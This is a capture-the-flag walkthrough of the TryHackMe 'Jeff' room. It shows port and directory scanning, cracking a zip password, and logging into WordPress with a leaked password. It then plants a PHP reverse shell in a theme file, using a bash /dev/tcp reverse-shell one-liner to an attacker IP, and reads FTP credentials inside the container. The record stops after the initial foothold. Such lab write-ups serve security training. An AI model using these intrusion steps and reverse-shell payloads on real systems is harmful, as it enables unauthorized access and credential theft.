# Jeff — Writeup

## Overview
### Jeff — Writeup
### Jeff — Writeup
----
Can you hack Jeff's web server?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/f2d2f43d2fc1c4369f40370874e2df3e.png)
Start Machine
**This machine may take upto 5 minutes to fully deploy.**
Get user.txt and root.txt.
This is my first ever box, I hope you enjoy it.
If you find yourself brute forcing SSH, you're doing it wrong.
Please don't post spoilers or stream the box for at least a couple of days.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ rustscan -a 10.10.114.83 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.114.83:22
Open 10.10.114.83:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.114.83 [2 ports]
Discovered open port 22/tcp on 10.10.114.83
Discovered open port 80/tcp on 10.10.114.83
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.114.83
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.114.83.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.114.83
Host is up, received user-set (0.19s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e435f1e58a8fcc9f7fd4b400b837932 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg4z+/foDFEWvhoIYbCJR1YFXJSwUz3Tg4eFCje6gUXuRlCbi+AFLKT7Z7YeukAOdGfucg+sDdVG1Uay2MmT0YcWpPaWgJUmeHP3u3fYzwXgc2hwrHag+VTuuRM8zwwyR6gjRFIv1F9zTSPJBCkCWIHulcklArT8OMWLdKVCNK3B8ml92yUIA3HqnsN4DlGOTbYkpKd1G33zYNTXDDPwSi2N29rxWYdfRIJGjGfVT+EXFzccLtK+n+BJqsislTXv7h2Xi2aAJhw66RjBLoopu86ugdayaBb/Wfc1x1vQXAJAnAO02GPKueq/IzFUYGh/dlci7VG1qTz217chshXTqX
|   256 5c7992dde9d1465070f0346226f06939 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNCLV+aPDHn2ot0aIXSYrRbvARScbRpkGp+hjzAI2iInTc6jgb7GooapeEZOpacn4zFpsI/PR8wwA2QhYXi3aNE=
|   256 ced9822b695f82d0f55c9b3ebe7688c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx35hakinwovxQnAWprmEBqZNVlj7JjrZO1WxDc/RF/
80/tcp open  http    syn-ack nginx
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ tac /etc/hosts
10.10.114.83 jeff.thm 

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ gobuster -t 64 dir -e -k -u jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jeff.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://jeff.thm/admin                (Status: 301) [Size: 178] [--> http://jeff.thm/admin/]
http://jeff.thm/assets               (Status: 301) [Size: 178] [--> http://jeff.thm/assets/]
http://jeff.thm/backups              (Status: 301) [Size: 178] [--> http://jeff.thm/backups/]
http://jeff.thm/index.html           (Status: 200) [Size: 1178]
http://jeff.thm/uploads              (Status: 301) [Size: 178] [--> http://jeff.thm/uploads/]
Progress: 4490 / 4615 (97.29%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ gobuster -t 64 dir -e -k -u jeff.thm/backups -w /usr/share/wordlists/dirb/common.txt -x zip,bak
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jeff.thm/backups
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              zip,bak
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://jeff.thm/backups/backup.zip           (Status: 200) [Size: 62753]
http://jeff.thm/backups/index.html           (Status: 200) [Size: 9]
Progress: 13841 / 13845 (99.97%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip backup.zip 
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
   skipping: backup/assets/EnlighterJS.min.css  incorrect password
   skipping: backup/assets/EnlighterJS.min.js  incorrect password
   skipping: backup/assets/MooTools-Core-1.6.0-compressed.js  incorrect password
   skipping: backup/assets/profile.jpg  incorrect password
   skipping: backup/assets/style.css  incorrect password
   skipping: backup/index.html       incorrect password
   skipping: backup/wpadmin.bak      incorrect password

┌──(witty㉿kali)-[~/Downloads]
└─$ zip2john backup.zip > backup_hash
ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
ver 1.0 backup.zip/backup/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: TS_chk, cmplen=14499, decmplen=49963, crc=545D786A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: TS_chk, cmplen=652, decmplen=1178, crc=39D2DBFF ts=7A80 cs=7a80 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/backup/wpadmin.bak PKZIP Encr: TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB ts=7A80 cs=7a80 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)     
1g 0:00:00:04 DONE () 0.2188g/s 3138Kp/s 3138Kc/s 3138KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip backup.zip                                         
Archive:  backup.zip
[backup.zip] backup/assets/EnlighterJS.min.css password: 
  inflating: backup/assets/EnlighterJS.min.css  
  inflating: backup/assets/EnlighterJS.min.js  
  inflating: backup/assets/MooTools-Core-1.6.0-compressed.js  
  inflating: backup/assets/profile.jpg  
  inflating: backup/assets/style.css  
  inflating: backup/index.html       
 extracting: backup/wpadmin.bak      
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cd backup 
                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ ls
assets  index.html  wpadmin.bak
                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ cat wpadmin.bak 
wordpress password is: phO#g)C5dhIWZn3BKP

┌──(witty㉿kali)-[~/Downloads/backup]
└─$ wfuzz -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.jeff.thm" --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jeff.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000001:   200        1 L      12 W       62 Ch       "www"                 
000000002:   200        1 L      12 W       62 Ch       "mail"                
000000006:   200        1 L      12 W       62 Ch       "smtp"                
000000010:   200        1 L      12 W       62 Ch       "whm"                 
 
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 50
Filtered Requests: 0
Requests/sec.: 0

                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ wfuzz -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.jeff.thm" --hc 404 --hw 12
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jeff.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000326:   200        346 L    1455 W     25901 Ch    "wordpress"  

┌──(witty㉿kali)-[~/Downloads/backup]
└─$ tac /etc/hosts
10.10.114.83 jeff.thm wordpress.jeff.thm 

http://wordpress.jeff.thm/wp-login.php

┌──(witty㉿kali)-[~/Downloads]
└─$ wpscan --url http://wordpress.jeff.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://wordpress.jeff.thm/ [10.10.114.83]
[+] Started: Fri Jul 14 13:58:30 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordpress.jeff.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on ).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=========> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul 14 13:58:56 2023
[+] Requests Done: 69
[+] Cached Requests: 6
[+] Data Sent: 16.26 KB
[+] Data Received: 20.43 MB
[+] Memory used: 168.273 MB
[+] Elapsed time: 00:00:25

jeff:phO#g)C5dhIWZn3BKP

http://wordpress.jeff.thm/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

or exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1'");

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://wordpress.jeff.thm/wp-content/themes/twentynineteen/404.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from jeff.thm [10.10.114.83] 53050
SOCKET: Shell has connected! PID: 109
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
sh: 1: python3: not found
sh: 1: python: not found
www-data@Jeff:/var/www/html/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@Jeff:/var/www/html$ ls -lah /
ls -lah /
total 76K
drwxr-xr-x   1 root root 4.0K May 18  2020 .
drwxr-xr-x   1 root root 4.0K May 18  2020 ..
-rwxr-xr-x   1 root root    0 May 18  2020 .dockerenv
drwxr-xr-x   1 root root 4.0K Apr 23  2020 bin
drwxr-xr-x   2 root root 4.0K Feb  1  2020 boot
drwxr-xr-x   5 root root  340 Jul 14 17:29 dev
drwxr-xr-x   1 root root 4.0K May 18  2020 etc
drwxr-xr-x   2 root root 4.0K Feb  1  2020 home
drwxr-xr-x   1 root root 4.0K Apr 23  2020 lib
drwxr-xr-x   2 root root 4.0K Apr 22  2020 lib64
drwxr-xr-x   2 root root 4.0K Apr 22  2020 media
drwxr-xr-x   2 root root 4.0K Apr 22  2020 mnt
drwxr-xr-x   2 root root 4.0K Apr 22  2020 opt
dr-xr-xr-x 115 root root    0 Jul 14 17:29 proc
drwx------   1 root root 4.0K May 18  2020 root
drwxr-xr-x   1 root root 4.0K Apr 23  2020 run
drwxr-xr-x   1 root root 4.0K Apr 23  2020 sbin
drwxr-xr-x   2 root root 4.0K Apr 22  2020 srv
dr-xr-xr-x  13 root root    0 Jul 14 17:29 sys
drwxrwxrwt   1 root root 4.0K Jul 14 17:29 tmp
drwxr-xr-x   1 root root 4.0K Apr 22  2020 usr
drwxr-xr-x   1 root root 4.0K Apr 23  2020 var

www-data@Jeff:/var/www/html$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.6	Jeff

www-data@Jeff:/var/www/html$ cat ftp_backup.php
cat ftp_backup.php
<?php
/* 
    Todo: I need to finish coding this database backup script.
	  also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 

www-data@Jeff:/tmp$ ls -la /usr/lib
ls -la /usr/lib
total 88
drwxr-xr-x  1 root root 4096 May 14  2020 .
drwxr-xr-x  1 root root 4096 Apr 22  2020 ..
drwxr-xr-x  1 root root 4096 Apr 23  2020 apache2
drwxr-xr-x  5 root root 4096 Apr 22  2020 apt
drwxr-xr-x  2 root root 4096 Apr 23  2020 bfd-plugins
drwxr-xr-x  2 root root 4096 Oct 15  2019 cgi-bin
drwxr-xr-x  2 root root 4096 Apr 23  2020 compat-ld
drwxr-xr-x  3 root root 4096 May 28  2019 dpkg
drwxr-xr-x  2 root root 4096 Apr 23  2020 file
drwxr-xr-x  1 root root 4096 Apr  6  2019 gcc
drwxr-xr-x  2 root root 4096 Apr 23  2020 gold-ld
drwxr-xr-x  3 root root 4096 May  1  2019 locale
drwxr-xr-x  1 root root 4096 Apr 23  2020 mime
-rw-r--r--  1 root root  261 Feb  1  2020 os-release
-rw-r--r--  1 root root   17 Jan 27  2019 pkg-config.multiarch
drwxr-xr-x  2 root root 4096 Jan 27  2019 pkgconfig
drwxr-xr-x  3 root root 4096 May 14  2020 python3
drwxr-xr-x 28 root root 4096 May 14  2020 python3.7
drwxr-xr-x  2 root root 4096 Dec 19  2019 sasl2
drwxr-xr-x  3 root root 4096 Apr 23  2020 ssl
drwxr-xr-x  1 root root 4096 May  6  2020 tmpfiles.d
drwxr-xr-x  1 root root 4096 May 14  2020 x86_64-linux-gnu

www-data@Jeff:/tmp$ python3
python3
bash: python3: command not found
www-data@Jeff:/tmp$ python3.7
python3.7
Python 3.7.3 (default, Dec 20 2019, 18:57:59) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()
exit()

